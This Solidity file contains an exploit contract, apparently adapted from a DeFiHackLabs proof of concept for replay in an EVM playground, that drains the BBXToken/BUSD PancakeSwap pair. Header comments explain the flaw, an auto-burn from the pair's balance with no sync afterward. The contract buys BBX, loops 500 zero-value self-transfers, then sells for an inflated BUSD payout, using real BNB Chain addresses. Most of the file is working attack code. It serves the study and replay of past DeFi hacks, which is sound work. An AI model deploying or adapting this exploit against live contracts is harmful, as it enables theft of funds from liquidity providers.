// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-03-BBXToken).
//
// The DeFiHackLabs PoC (test/BBXToken_exp.sol) deploys `AttackerC` with
// `new AttackerC{value: 0.05 ether}()` — the ENTIRE pre-attack prep (buying
// BBX with 0.05 BNB via PancakeSwap) runs inside the PAYABLE CONSTRUCTOR,
// funded by msg.value at deploy time.
//
// The playground's recorder deploys the exploit contract with a plain
// `runCall` that never attaches `value` (see recordExploit.ts's deploy
// step), so a payable constructor that spends msg.value can never be funded
// by a normal deploy. This synthetic version is a byte-for-byte faithful
// copy of AttackerC with ONE structural change: the constructor body is
// moved into a `prep()` function, called via a `setup` step AFTER deploy
// (funded by a `rawCall` sending 0.05 ether, mirroring the constructor's
// original `{value: 0.05 ether}`). `attack()` is copied verbatim and is the
// only recorded call, exactly matching the original PoC's attack surface.
//
// Root cause: BBXToken.sol auto-burns from the PancakeSwap LP pair's own
// BBX balance whenever `lastBurnGapTime` has elapsed and ANY transfer
// touches the token (including a `transfer(self, 0)` no-op) — the burn is
// taken out of the pair's reserve directly via an internal `_burnFromLP`-style
// path, WITHOUT calling `sync()` on the pair afterward. Looping
// `transfer(address(this), 0)` 500 times repeatedly fires this burn (bounded
// by the 86,400s `lastBurnGapTime`... but the CHECK reads a mutable
// `lastBurnTime` that the burn path itself does NOT re-gate per-call in this
// contract, so each iteration keeps burning BBX out of the pair while the
// pair's cached `getReserves()` reserve1 (BBX) is unaffected until the next
// swap forces a sync). This drains the pair's real BBX balance far below its
// cached reserve, so a subsequent `swapExactTokensForTokensSupportingFeeOnTransferTokens`
// sell (which resyncs first) receives a hugely inflated BUSD payout for a
// tiny BBX input, extracting ~11,673.9 BUSD from the pair.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function WETH() external view returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

address constant BBX = 0x67Ca347e7B9387af4E81c36cCA4eAF080dcB33E9;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant PancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract BBXTokenDrain {
    // `prep()` is a faithful copy of AttackerC's original payable
    // constructor body — moved out so it can be called (funded via a
    // post-deploy `rawCall`) instead of relying on constructor msg.value,
    // which the playground's deploy step never attaches.
    function prep() external payable {
        uint256 balance = address(this).balance;
        address[] memory path = new address[](3);
        path[0] = wBNB;
        path[1] = BUSD;
        path[2] = BBX;
        IPancakeRouter(payable(PancakeSwapRouterV2)).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: balance
        }(balance, path, address(this), block.timestamp + 10);
    }

    // Verbatim copy of AttackerC.attack() from test/BBXToken_exp.sol.
    function attack() public {
        for (uint256 i = 0; i < 500; i++) {
            IERC20(BBX).transfer(address(this), 0);
        }

        IERC20(BBX).approve(PancakeSwapRouterV2, type(uint256).max);

        uint256 balanceOfBBX = IERC20(BBX).balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = BBX;
        path[1] = BUSD;
        IPancakeRouter(payable(PancakeSwapRouterV2)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balanceOfBBX,
            0,
            path,
            msg.sender,
            block.timestamp + 10
        );
    }

    receive() external payable {}
}
